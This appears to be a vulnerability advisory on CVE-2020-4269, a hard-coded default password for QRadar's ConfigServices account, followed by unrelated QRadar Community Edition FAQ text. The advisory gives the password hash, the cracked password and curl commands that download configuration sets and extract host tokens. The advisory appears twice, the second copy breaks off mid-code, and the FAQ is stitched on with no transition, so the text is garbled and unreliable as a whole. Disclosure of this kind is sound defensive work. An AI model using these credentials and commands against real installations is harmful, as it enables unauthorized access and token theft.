Unauthorized access to QRadar configuration sets via default password
------------------------------------------------------------------------
Yorick Koster, September 2019

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
QRadar is deployed with a default password for the ConfigServices
account. Using this default password it is possible to download
configuration sets containing sensitive information, including
(encrypted) credentials and host tokens. With these host tokens it is
possible to access other parts of QRadar.

CVE-2020-4269 [2]
6189711 [3] - IBM QRadar SIEM contains hard-coded credentials
(CVE-2020-4269)

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully verified on QRadar Community Edition [4]
version 7.3.1.6 (7.3.1 Build 20180723171558).

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
IBM has released the following versions of QRader in which this issue
has been resolved:

- QRadar / QRM / QVM / QNI 7.4.0 GA [5] (SFS)
- QRadar / QRM / QVM / QRIF / QNI 7.3.3 Patch 3 [6] (SFS)
- QRadar / QRM / QVM / QRIF / QNI 7.3.2 Patch 7 [7] (SFS)
- QRadar Incident Forensics 7.4.0 [8] (ISO)
- QRadar Incident Forensics 7.4.0 [9] (SFS)

As a workaround it is possible to remove or disable the configservices
account in the file /opt/qradar/conf/users.conf.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
QRadar [10] is IBM's enterprise SIEM [11] solution. A free version of
QRadar is available that is known as QRadar Community Edition [4]. This
version is limited to 50 events per second and 5,000 network flows a
minute, supports apps, but is based on a smaller footprint for
non-enterprise use.

So-called configuration sets can be downloaded via the web interface.
These sets are normally only accessible for the ConfigServices user. It
was found that QRadar is deployed with a default password for the
ConfigServices account. Using this default password it is possible to
download configuration sets containing sensitive information, including
(encrypted) credentials and host tokens. With these host tokens it is
possible to access other parts of QRadar.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The Apache configuration for the QRadar web interface contains a
configuration alias that maps to the
/store/configservices/configurationsets folder. This folder is protected
with the mod_authn_file [12] Apache Module. The only user that is
allowed through is the configservices user.

/etc/httpd/conf.d/configservices_httpd.conf:
Alias /configuration /store/configservices/configurationsets
<Directory /store/configservices/configurationsets>
        AuthType Basic
        AuthUserFile  /opt/qradar/conf/users.conf
        AuthName "Identification"
        Options Indexes Includes FollowSymLinks MultiViews ExecCGI
        AllowOverride All

        <Limit GET POST>
        require user configservices
        </Limit>
</Directory>

The password for this user is set in the file
/opt/qradar/conf/users.conf. The password is protected with the crypt
algorithm, the crypted password is the same for all QRadar
installations.

/opt/qradar/conf/users.conf:
admin:null:ALL:root@localhost:Admin:
configservices:/wEPae8TzCqmM:ALL::ConfigServices:

Cracking the crypted password quickly reveals that the corresponding
password is qradar:

$ python -c 'import crypt; print(crypt.crypt("qradar", "/w"))'
/wEPae8TzCqmM

With the found password it is now possible to download the configuration
set from the web server:

$ curl --insecure --user configservices:qradar
https://<ip>/configuration/globalset_list.xml

It should be noted that the default password of the configservices user
only works for the configuration alias as configured in Apache. Recent
versions of QRadar still use the ConfigServices user in other parts of
the web interface. These parts either use a random password (stored in
PostgreSQL) or a so-called host token (via the SEC header or cookie).
However, using the default password it is possible to retrieve the value
of this host token and thus gain access to other parts of QRadar.

curl --insecure --user configservices:qradar -o
/tmp/zipfile_GEN.full.zip
https://<ip>/configuration/zipfile_GEN.full.zip
unzip -p /tmp/zipfile_GEN.full.zip /host_tokens.masterlist | grep
'CONSOLE_HOSTCONTEXT='

------------------------------------------------------------------------
Limitations
------------------------------------------------------------------------
The users.conf configuration file is updated when changes are made to
the user and or permission configuration of QRadar. The new users.conf
is first written to staging and made effective when the changes to
staging have been deployed. When this happens the password digest of the
configservices user is overwritten with null effectively disabling the
account. Consequently, on larger setups it is likely that changes have
been made to the user/permission configuration and that the default
password will no longer work.

com.q1labs.core.shared.permissions.UserManager:
public class UserManager extends SingletonSupport implements
IMessageListener {
[...]

        public void updateConfigurationFile() {
                String configRoot = NVAReader.getProperty("CONFIGSERVICES_ROOT");

                try {
                        File target = new File(configRoot + STAGED_CONFIG_FILENAME);
                        StringBuffer sb = new StringBuffer();
                        List users = this.getStagedUsers();
                        Iterator var5 = users.iterator();

                        while(var5.hasNext()) {
                                User u = (User)var5.next();
                                String networkNames = PermissionsManager.getNetworkNames(u);
                                String userRoleName = PermissionsManager.getUserRoleName(u);
                                String locale = u.getLocale() == null ? " " : u.getLocale();
                                String tmzone = u.getTimezone() == null ? " " : u.getTimezone();
                                sb.append(u.getUserName() + ":null:" + networkNames + ":" + u.getEmail() + ":" +
userRoleName + ":" + locale + ":" + tmzone + ":\n");
                        }

                        FileIOUtils.safeWriteBuffer(target, sb);
                } catch (Exception var11) {
                        this.log.error((Object)("Can't save deployed " + TABLENAME + " to configuration file"),
(Throwable)var11);
                }

        }

As a workaround it is possible to remove or disable the `configservices` account in the file `/opt/qradar/conf/users.conf`.

## Introduction

[QRadar](https://www.ibm.com/security/security-intelligence/qradar) is IBM's enterprise [SIEM](https://en.wikipedia.org/wiki/Security_information_and_event_management) solution. A free version of QRadar is available that is known as [QRadar Community Edition](https://developer.ibm.com/qradar/ce/). This version is limited to 50 events per second and 5,000 network flows a minute, supports apps, but is based on a smaller footprint for non-enterprise use.

So-called configuration sets can be downloaded via the web interface. These sets are normally only accessible for the `ConfigServices` user. It was found that QRadar is deployed with a default password for the `ConfigServices` account. Using this default password it is possible to download configuration sets containing sensitive information, including (encrypted) credentials and *host tokens*. With these host tokens it is possible to access other parts of QRadar.

## Details

The Apache configuration for the QRadar web interface contains a `configuration` alias that maps to the `/store/configservices/configurationsets` folder. This folder is protected with the [`mod_authn_file`](https://httpd.apache.org/docs/2.4/mod/mod_authn_file.html) Apache Module. The only user that is allowed through is the `configservices` user.

***/etc/httpd/conf.d/configservices\_httpd.conf:***

```
Alias /configuration /store/configservices/configurationsets
<Directory /store/configservices/configurationsets>
	AuthType Basic
	**AuthUserFile  /opt/qradar/conf/users.conf**
	AuthName "Identification"
	Options Indexes Includes FollowSymLinks MultiViews ExecCGI
	AllowOverride All

	<Limit GET POST>
	**require user configservices**
	</Limit>
</Directory>

```

The password for this user is set in the file `/opt/qradar/conf/users.conf`. The password is protected with the *crypt* algorithm, the crypted password is the same for all QRadar installations.

***/opt/qradar/conf/users.conf:***

```
admin:null:ALL:root@localhost:Admin:
configservices:/wEPae8TzCqmM:ALL::ConfigServices:

```

Cracking the crypted password quickly reveals that the corresponding password is *qradar*:

```
$ python -c 'import crypt; print(crypt.crypt("qradar", "/w"))'
/wEPae8TzCqmM

```

With the found password it is now possible to download the configuration set from the web server:

```
$ curl --insecure --user configservices:qradar https://<ip>/configuration/globalset_list.xml

```

It should be noted that the default password of the `configservices` user only works for the `configuration` alias as configured in Apache. Recent versions of QRadar still use the `ConfigServices` user in other parts of the web interface. These parts either use a random password (stored in PostgreSQL) or a so-called host token (via the `SEC` header or cookie). However, using the default password it is possible to retrieve the value of this host token and thus gain access to other parts of QRadar.

```
curl --insecure --user configservices:qradar -o /tmp/zipfile_GEN.full.zip https://<ip>/configuration/zipfile_GEN.full.zip
unzip -p /tmp/zipfile_GEN.full.zip /host_tokens.masterlist | grep 'CONSOLE_HOSTCONTEXT='

```
## Limitations

The `users.conf` configuration file is updated when changes are made to the user and or permission configuration of QRadar. The new `users.conf` is first written to staging and made effective when the changes to staging have been deployed. When this happens the password digest of the configservices user is overwritten with `null` effectively disabling the account. Consequently, on larger setups it is likely that changes have been made to the user/permission configuration and that the default password will no longer work.

***com.q1labs.core.shared.permissions.UserManager:***

```
public class UserManager extends SingletonSupport implements IMessageListener {
[...]

	public void updateConfigurationFile() {
		String configRoot = NVAReader.getProperty("CONFIGSERVICES_ROOT");

		try {
			File target = new File(configRoot + STAGED_CONFIG_FILENAME);
			StringBuffer sb = new StringBuffer();
			List users = this.getStagedUsers();
			Iterator var5 = users.iterator();

			while(var5.hasNext()) {
				User u = (User)var5.next();
				String networkNames = PermissionsManager.getNetworkNames(u);
				String userRoleName = PermissionsManager.getUserRoleName(u);
				String locale = u.getLocale() == null ? " " : u.getLocale();
				String tmzone = u.getTimezone() == null ? " " : u.getTimezone();
				sb.append(u.getUserName() + ":**null**:" + networkNames + ":" + u.getEmail() + ":" + userRoleName + ":" + locale + ":" + tmzone + ":\n");
			}

			FileIOUtils.safeWriteBuffer(target, sb);
		} catch (Exception var11) {
			this.log.error((Object)("Can't save deployed " + TABLENAME + " to configuration file"), (Throwable)var11);
		}

	}

Security Data in QRadar SIEM is added as Log Sources, which listen for data from or connect to remote
sources
to collect events. Each log source has a corresponding Device Support Module (DSM) that parses and
normalizes events for 400+ devices. Users on QRadar Community Edition 7.5.0 and later require a larger
footprint to run
QRadar Community Edition, but have access to all of the same DSMs and protocols as enterprise customers.
Several log source types can auto discover in QRadar by DSM type or event format, such as LEEF, JSON,
CEF, or Name Value Pair (NVP). Users can launch the Log Source Management (LSM) app to manually add or
modify log sources in QRadar.

1. Review the [QRadar
   Supported DSMs list](https://www.ibm.com/docs/en/qsip/7.5?topic=configuration-qradar-supported-dsms).
2. Run a QRadar automatic update to get the latest DSMs and Protocols.
3. Use the [Log
   Source Management app](https://www.ibm.com/docs/en/qsip/7.5?topic=configuring-qradar-log-source-management-app) to add or configure your log sources that do not auto discover.
4. Advanced. Use the [DSM
   Editor](https://www.ibm.com/docs/en/qsip/7.5?topic=administration-event-data-processing-in-qradar) to create your own Log Source Type.

QRadar Community Edition FAQ
**Who can download QRadar Community Edition?**

QRadar Community Edition is a free version of our enterprise QRadar SIEM that is provided without
warranty or support. Users can download a 3-month license that can be extended each quarter to
continue using Community Edition. QRadar Community Edition offers students, developers,
security teams, or small organizations the option to use QRadar under a limited license. As
QRadar SIEM is subject to export restrictions, some users are not able to download the software
where the United States Export Administration Regulations (EAR) has declared a restriction.

**Is the QRadar Community Edition free of charge?**

Yes, QRadar Community Edition is available to users at no cost and is provided as-is without
warranty or support.

**Can I upgrade QRadar Community Edition?**

QRadar Community Edition is based off of our enterprise QRadar SIEM (Classic) release of QRadar
7.5.0 Update Package 10. Users who have entitlement to IBM Fix Central through work or your
corporate account have access to download an SFS that can be used to upgrade your version.
Students, app developers, or security enthusiasts who download QRadar Community Edition would
not have access, so QRadar Community Edition is not considered as an upgradeable version for
non-enterprise users.

* Access to IBM Fix Central: If yes, and you have access to IBM Fix Central and entitlement to
  QRadar SIEM, you can upgrade to the latest version with an Upgrade Package (SFS file) and
  then apply the QRadar Community Edition license file from this website.
* Access to IBM Fix Central: No. Users who want to upgrade to a newer version can install the
  latest ISO file to flatten their existing installation of QRadar Community Edition.

**Can I renew my license for QRadar Community Edition?**

Users who have installed QRadar Community Edition where the 3-month license has expired can
return to this site and download the latest key file. You are not required to reinstall or
upgrade to the latest QRadar Community Edition and can apply the latest key to extend your
current install. As QRadar Community Edition is a non-warranted product and offered as-is, you
as the downloader are the responsible party for your network and software security. IBM
recommends that users upgrade to the latest version when new ISOs are posted for QRadar
Community Edition.

* Access to IBM Fix Central: If yes, and you have access to IBM Fix Central and entitlement to
  QRadar SIEM, you can upgrade to the latest version with an Upgrade Package (SFS file) and
  then apply the QRadar Community Edition license file from this website.
* Access to IBM Fix Central: No. Users who want to upgrade to a newer version can install the
  latest ISO file to flatten their existing installation of QRadar Community Edition.

**Can I install other appliance or managed host types?**

QRadar Community Edition includes a license that is intended for users to install QRadar as an
All-in-One Console appliance. The installation menu in the installer allows users to select
other appliance types or use the ISO file to install managed hosts and connect them to the
Console. Users can install an App Host appliance as it does not require an EPS license. However,
other appliance types you attached to the Console will experience license issues after the
initial license expires.

* QRadar Console
* App Host appliance

**Is there support for QRadar Community Edition?**

No. QRadar Community Edition is provided without warranty or support assistance. Users who
require assistance can discuss QRadar Community Edition in the forums, but QRadar Support does
not take support cases or tickets on QRadar Community Edition from any users. Entitled users
with support contacts who use QRadar Community Edition in a lab environment should not open
cases.

**What is the operating systems for QRadar Community Edition?**

Red Hat Enterprise 8.8 (Ootpa) is the operating system (OS) that runs QRadar Community Edition.

**Can I install QRadar Community Edition on a Cloud provider?**

QRadar Community Edition is intended to be deployed on a VM or physical hardware. Users can
deploy QRadar Community Edition on Amazon AWS, Microsoft Azure, or Google Cloud, but there are
no marketplace images available at this time for these platforms. When the enterprise version of
QRadar SIEM is released, there is typically a marketplace image to streamline the installation
process for full product users. However, these versions do not exist for QRadar Community
Edition, so any installation types on a cloud provided would be a custom install type and might
not install as expected.

QRadar Reddit (/r/QRadar)

IBM Community Forums

**Are automatic updates available in QRadar Community Edition?**

Yes, daily and weeekly auto updates are provided to users on QRadar Community Edition. As
protocols, device support modules (DSMs), QRadar identifiers (QID map), and scanner modules are
released, these are received by QRadar Community Edition installations that have network
visibility to **https://auto-update.qradar.ibmcloud.com/**. If you have a proxy
enabled in your lab environment or strict firewall blocking, you might be required to update
your rules to allow the auto update.

**Can I download and install apps from the X-Force App Exchange?**

QRadar Community Edition users can install any applications from the X-Force App Exchange.
Applications can use anywhere from 200MB to 2GB or RAM based on the app capabilities, such as
Machine Learning. Administrators might not be able to install applications that exceed the
default 10% of RAM allocated to the Console. Users who install at 24GB of RAM have 2.4GB of RAM
allocated to run applications or content such as rules, dashboards, searches, or custom
properties added through QRadar content packs.

Development Best Practices

**I am having problems installing QRadar Community Edition. Who can help?**

There is a robust online community where you can post questions and learn from peers. Users can
ask questions in the QRadar subreddit or the Community forums to ask other users about
particular questions or installation issues.

**Are any features disabled in QRadar Community Edition?**

QRadar Community Edition has all of the same features as our enterprise QRadar SIEM 7.5.0 Update
Package 10 release. Community Edition users are limited to 100 EPS and cannot install add-on
products or managed hosts, such as Event Processors, QRadar Network Insights, Risk Manager,
Event Collectors, or Data Nodes. Users can install other software, such as WinCollect 10 or the
Disconnected Log Collector to send in events to QRadar Community Edition.
